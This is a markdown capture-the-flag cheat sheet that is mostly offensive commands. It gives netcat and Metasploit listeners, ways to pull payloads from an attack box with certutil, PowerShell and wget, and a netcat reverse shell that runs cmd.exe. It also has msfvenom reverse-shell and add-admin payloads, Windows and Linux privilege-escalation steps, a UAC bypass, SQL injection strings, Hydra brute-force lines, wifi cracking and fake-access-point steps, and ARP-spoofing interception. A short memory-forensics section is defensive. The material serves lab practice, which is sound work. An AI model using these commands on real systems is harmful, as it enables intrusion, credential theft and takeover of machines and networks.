# CTF Cheat Sheet

## Commands:

```sudo -l (NOTE: lists commands a user can run as root) ```
    
```echo 10.10.165.196 ice >> /etc/hosts```
    
```mkdir /mnt/kenobiNFS```
```mount machine_ip:/var /mnt/kenobiNFS```
```ls -la /mnt/kenobiNFS```

## Wordlists:

https://wiki.skullsecurity.org/Passwords

https://web.archive.org/web/20120207113205/

http://www.insidepro.com/eng/download.shtml

/usr/share/wordlists

## Webshells:

/usr/share/webshells

## Pre-Compiled Binaries:

/usr/share/windows-binaries

## Listeners:

**metasploit:**

	use exlpoit/multi/handler
	set lhost [attackbox IP]
	set lport [attackbox port]
	run
	
**netcat:**

	nc -lvnp [port]
	
## Transferring Exploits:

**Python3 Simple HTTP Server:**

    	python3 -m http.server 80		(Specific to current direct ran from)
	or if python3 is default in path:
	python -m http.server 80
	
	hosted @ http://[attackbox IP]
	
**wget:**

	wget http://[IP attack box][:port]/[File name]
	

**CertUtil.exe:**

	certutil -urlcache -split -f [URL] [Filename.Extension]
	certutil -urlcache -split -f http://[IP] nc.exe
	
	certutil.exe -encode [inputFileName] [encodedOutputFileName]
	certutil.exe -urlcache -split -f "http://[Attack box IP]/nc.txt" nc.txt
	certutil.exe -decode nc.txt nc.exe
	nc.exe [Attack box IP] 5555 -e cmd.exe
	
**VBScript file downloader:**

	echo [script code] > httpdownload.vbs
	echo [script code] >> httpdownload.vbs
	
**PowerShell Downloads:**

	echo $webclient = New-Object System.Net.WebClient > httpdownload.ps1
	echo $webclient.DownloadFile("[Download URL]","[File Name]") >> httpdownload.ps1
	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File httpdownload.ps1
	
	powershell -c "(new-object System.Net.WebClient).DownloadFile('[Download URL]','[File Name]')"
	powershell -c "(new-object System.Net.WebClient).DownloadFile('http://172.16.3.1/nc.exe','nc.exe')"
	
	powershell Import-Module BitsTransfer;Start-BitsTransfer -Source http://[IP Attack box]/nc.exe -Destination C:\
	
	powershell Invoke-WebRequest -Uri http://[IP Attack box]/nc.exe -OutFile C:\nc.exe
	
**Netcat File Transfers:**

	nc -lvp 8080 > /root/Desktop/transfer.txt
	nc 192.168.100.107 8080 < /root/Desktop/transfer.txt
	
## SSH:
    
```chmod 600 id_rsa```   
    
```ssh -i id_rsa username@{ipaddress}```
    
## NMAP:
    
    nmap -A -p- -vvv {IPAddress}
    
    nmap -A -p- --script vuln -vvv {IPAddress}
    
    nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.39.217
     
    nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.39.217

## smbclient:

```smbclient //<ip>/anonymous```
    
```smbget -R smb://<ip>/anonymous```

## smbserv:

cp /usr/share/doc/python-impacket/examples/smbserver.py .   
python smbserver.py share [directory]
     
## Research:

GTFO Bins (https://gtfobins.github.io/)
    
## HTTP/HTTPS:

    Ports: 80 = http, 443 = https
    Methods: GET, POST, 
    Status Codes: "100-199 info, 200-299 Successes, 300-399 Redirects, 400-499 Client Errors, 
    500-599 Server errors" Source = https://developer.mozilla.org/en-US/docs/Web/HTTP/Status
    
**Mozilla Firefox:**
        
        F12 = developer tools
        storage = cookies, "+" = add cookies
        https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
        
**cURL:**
        
        curl https://tryhackme.com
        -X specifies the request
        --data specifies POST data
        example: curl http://10.10.75.167:8081/ctf/post -X POST --data flag_please
	
    
## Linux Priv Esc:

**Gather Info:**
	
	Kernel & hostname:
	
	cat /etc/issue
	cat /proc/version
	hostname
	uname -a
	
	Users:
	
	cat /etc/passwd
	id
	who
	w
	
	sudo -l
	
	Networking Info:
	
	ifconfig -a
	route
	netstat -antup
	arp -e
	
	Applications & Services:
	
	ps aux
	dpkg -l
	rpm -qa
	ls -ls /etc/ | grep .conf
	ls -ls /var/www/html
	
	(find SUID programs)
	find /* -user root -perm -4000 -print 2>/dev/null
	
	Files and file systems:
	cat /etc/fstab
	
	(find world writable directories)
	find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root
	
	(find world writable directories for root)
	find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root
	
	(find world writable files)
	find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null
	
	(find world writable files in /etc)
	find /etc -perm -2 -type f 2>/dev/null
	
	(find world writable directories)
	find / -writable -type d 2>/dev/null
	
	LinPeas
	wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
	
	Linux privesc checker
	wget http://www.securitysift.com/download/linuxprivchecker.py
	python linuxprivchecker.py
		
	
**Enumeration:** https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
    
**Escaping Vi Editor:**
        sudo vi
        :!sh

**/etc/passwd:**
```format example: test:x:0:0:root:/root:/bin/bash```

```username:password (x represents password in /etc/shadow file):user id (UID):Group ID (GID): user id info (comment):home directory: command/shell```


**If Vulnerable to CVE-2019-14287 and has sudo permissions use:**
     	
		sudo -u#-1 /bin/bash
## Windows PrivEsc

**Gather Info:**

	To gather system information:

	systeminfo

	To check the OS version:

	systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

	To check active network connections:

	netstat -ano

	To check for firewall settings:

	netsh firewall show state

	netsh firewall show config

	Use the following command to check the scheduled tasks:

	schtasks /query /fo LIST /v

	To check running processes linked to services:

	tasklist /SVC

	To check for running services:

	net start

	To check for installed drivers:

	DRIVERQUERY

	With the following command you can check for installed patches:

	wmic qfe get Caption,Description,HotFixID,InstalledOn

	Search for interesting files names.

	The following command searches the system for files that contain ‘password’ in the filename:

	dir /s *password*
	
	You can also search file contents for specific keywords, such as the password. The following command searches for the keyword ‘password’ in files with the .txt extension:

	findstr /si password *.txt
	
**Search for Unquoted Service Paths:**

	wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
	
	sc qc [service name]
	
	icacls [Directory]
	
	icacls "C:\Program Files\Program"
	
	Create a reverse shell payload:
	msfvenom -p windows/meterpreter/reverse_tcp -e LHOST=[LHOST IP] LPORT=443 -f exe -o Some.exe
	
	sc stop [service name]
	sc start [service name]
	
**Modifying the binary service path:**

	To display services that can be modified by an authenticated user type:

	accesschk.exe -uwcqv "Authenticated Users" * /accepteula

	A service with write permissions for an authenticated user will look like the following:

	RW [service name] SERVICE_ALL_ACCESS

	Use this command to show the service properties:

	sc qc [service name]

	In order to exploit this misconfiguration, we have to change the BINARY_PATH_NAME on the service and change it to a malicious executable which can be done using these commands:

	sc config [service name] binpath= "malicious executable path"

	sc stop [service name]

	sc start [service name]

	We can also use the binary path to add a new user and grant administrator rights:

	sc config [service name] binpath= "net user admin password /add"

	sc stop [service name]

	sc start [service name]

	sc config [service name] binpath= "net localgroup Administrators admin /add"

	sc stop [service name]

	sc start [service name]

	Metasploit Module to exploit this vulnerability with Metasploit: exploit/windows/local/service_permissions
	
**AlwaysInstallElevated Setting:**

	You can check the values of these registry keys using the following commands:

	reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

	reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

	When the AlwaysInstallElevated is enabled in the registry entries we can use MSFVenom to create a payload. Use the following command to generate and add user payload:

	msfvenom -p windows/adduser USER=admin PASS=password -f msi -o filename.msi

	Instead of having the payload generate a new user on the system we can also create a reverse shell payload with the following command:

	msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=[LHOST IP] LPORT=443 -f msi -o filename.msi

	Finally, run the following command on the target system to execute the msi installer file:

	msiexec /quiet /qn /i C:\Users\filename.msi

	Let’s explain the different flags that we’ve used in this command:

    		The /quiet flag will bypass UAC.
    		The /qn flag specifies to not use a GUI.
    		The /i flag is to perform a regular installation of the referenced package.

	The command will execute the malicious payload and add an administrator user to the system or trigger a reverse shell with system privileges back to the attack box.

	To exploit this vulnerability with Metasploit you can use the following Metasploit Module: exploit/windows/local/always_install_elevated
	
**Unattended Install Files:**


    C:\Windows\Panther\
    C:\Windows\Panther\Unattend\
    C:\Windows\System32\
    C:\Windows\System32\sysprep\


    Unattend.xml
    unattended.xml
    unattend.txt
    sysprep.xml
    sysprep.inf
**Bypassing UAC with Metaploit:**

	Use "background" to background your meterpreter shell.
	Then, to set the UAC bypass module in Metasploit type:

	use exploit/windows/local/bypassuac

	Next you set the session ID and the listening host IP and run the exploit with:

	set session [Session ID]

	set lhost [VPN IP]

	run
	
	getsystem
	
**Windows Exploit Suggester:**

	Coming Soon
	
**WMI Hotfixes:**

	Coming Soon
	
**WinPEAS:**

	See: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
	
**Other Scripts & Tools:

	Common Exploits

	These next exploits are common privilege escalation exploits for Windows and worth trying if you come across matching operating systems.
	Windows Vista/7 – Elevation of Privileges (UAC Bypass)

	https://www.exploit-db.com/exploits/15609/

	This exploit applies to:

    		Windows Vista/2008 6.1.6000 x32,
   		Windows Vista/2008 6.1.6001 x32,
    		Windows 7 6.2.7600 x32,
    		Windows 7/2008 R2 6.2.7600 x64.

	Microsoft Windows 7 SP1 (x86) – ‘WebDAV’ Privilege Escalation (MS16-016)

	https://www.exploit-db.com/exploits/39432/

	And here’s a pre-compiled version that pops a system shell within the same session instead of in a new window:

	https://www.exploit-db.com/exploits/39788/

	This applies to:

    		Windows 7 SP1 x86 (build 7601)

	Microsoft Windows 7 SP1 (x86) – Privilege Escalation (MS16-014)

	https://www.exploit-db.com/exploits/40039/

	This applies to:

    		Windows 7 SP1 x86
	
	Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64) – Privilege Escalation (MS16-032)

	https://www.exploit-db.com/exploits/39719/

	This applies to:

    		Windows 7 x86/x64
    		Windows 8 x86/x64
    		Windows 10
    		Windows Server 2008-2012R2

	CVE-2017-0213: Windows COM Elevation of Privilege Vulnerability

	https://www.exploit-db.com/exploits/42020/

	This applies to:

    		Windows 10 (1511/10586, 1607/14393 & 1703/15063)
    		Windows 7 SP1 x86/x64

	Precompiled exploits:

	https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213

	https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213
	CVE-2019-1253: Windows Elevation of Privilege Vulnerability

	This vulnerability applies to:

    		Windows 10 (all versions) that are not patched with September (2019) update

	https://github.com/padovah4ck/CVE-2019-1253
	CVE-2019-0836: Microsoft Windows 10 1809

	This vulnerability applies to:

    		Windows 10 (1607,1703, 1709, 1803, 1809)
    		Windows 7 and Windows 8.1
    		Windows server 2008 (R2), 2012 (R2), 2016 (Server Core) and 2019 (Server Core)

	https://www.exploit-db.com/exploits/46718

	https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0836

	https://www.rapid7.com/db/vulnerabilities/msft-cve-2019-0836

## Generate Password Hash:

```openssl passwd -1 -salt [salt] [password]```

## DIR:
```gobuster dir -u http://<ip>:3333 -w <word list location>```
        
        
## SQL Injection:

    X' or '1'='1' --

    ' or 1='1
    
## John: 

```john --format=NT --rules --pot=lab.pot --progress-every=3 --wordlist=/usr/share/wordlists/rockyou.txt lab.txt```
    
    
    
## Hydra:

```hydra -l {username} -P /usr/share/wordlists/rockyou.txt http-get://{address or ip}:{port}```

```hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp```

```hydra -l user -P passlist.txt ftp://192.168.0.1```

```hydra -l <username> -P <full path to pass> <ip> -t 4 ssh```

```hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.176.160 -t 4 ssh```

```hydra -l -P http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V```

```hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.176.160 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V```
    
    SECTION             FUNCTION

    hydra                   Runs the hydra tool

    -t 4                    Number of parallel connections per target

    -l [user]               Points to the user who's account you're trying to compromise

    -P [path to dictionary] Points to the file containing the list of possible passwords

    -vV                     Sets verbose mode to very verbose, shows the login+pass combination for each attempt

    [machine IP]            The IP address of the target machine

    ftp / protocol          Sets the protocol
    
## Metasploit:

```run post/multi/recon/local_exploit_suggester```
    
```run post/windows/manage/enable_rdprdp```

## MSF Venom:

```msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R```
```msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R echo [MSFVENOM OUTPUT] > "scriptname".sh```
    
    -p = payload
    lhost = our local host IP address
    lport = the port to listen on
    R = export the payload in raw format
    

## PS Empire:

https://www.bc-security.org/post/the-empire-3-0-strikes-back
    
https://github.com/BC-SECURITY/Empire/
    
    COMMANDS:
    
        listeners
        uselistener
        uselistener {tab key}
        uselistener http
        info
        execute
        usestager {tab key}
        agents
        interact
        searchmodule
        
        
## TCPDUMP:

```sudo tcpdump ip proto \\icmp -i interface```
    
## WIFI:

**Crack Wifi Password:**
	
	airmon-ng start wlan0
	airodump-ng mon0
	airodump-ng -c (channel) --bssid (bssid) -w /root/Desktop/ (monitor interface)
	aireplay-ng -0 2 -a (router bssid) -c (client station number) mon0
	aircrack-ng -a2 -b (router bssid) -w (path to wordlist) /Root/Desktop/*.cap

**Create a Fake Network:**
	
	airmon-ng
	airmon-ng start wlan0
	airodump-ng mon0
	airbase-ng -a (router BSSID) --essid "(network name)" -c (channel) mon0
	iwconfig wlan0 txpower 27

    
## Memory DFIR:
### Tools:
**FTK Imager** - https://accessdata.com/product-download/ftk-imager-version-4-2-0
**Redline** - https://www.fireeye.com/services/freeware/redline.html
**DumpIt.exe**
**win32dd.exe / win64dd.exe**
        
Offline machines, however, can have their memory pulled relatively easily as long as their drives aren't encrypted. 
For Windows systems, this can be done via pulling the  following file:     %SystemDrive%/hiberfil.sys
         
    VMware - .vmem file
    Hyper-V - .bin file
    Parallels - .mem file
    VirtualBox - .sav file NOTE: This is only a partial memory file. You'll need to dump memory like a normal bare-metal system for this hypervisor
                
**volatility  (cmd line tool):**
       
                volatility -f MEMORY_FILE.raw imageinfo
                volatility -f MEMORY_FILE.raw --profile=PROFILE pslist
                volatility -f MEMORY_FILE.raw --profile=PROFILE netscan
                volatility -f MEMORY_FILE.raw --profile=PROFILE psxview
                volatility -f MEMORY_FILE.raw --profile=PROFILE ldrmodules
                volatility -f MEMORY_FILE.raw --profile=PROFILE apihooks
                volatility -f MEMORY_FILE.raw --profile=PROFILE malfind -D <Destination Directory>
                volatility -f MEMORY_FILE.raw --profile=PROFILE dlllist
                volatility -f MEMORY_FILE.raw --profile=PROFILE --pid=PID dlldump -D <Destination Directory>
		
## MITM:

    echo 1 > /proc/sys/net/ipv4/ip_forward
    arpspoof -i wlan0 -t (router address) (target computer address)
    arpspoof -i wlan -t (target computer address) (router address)
    urlsnarf -i wlan0
    driftnet -i wlan0

         
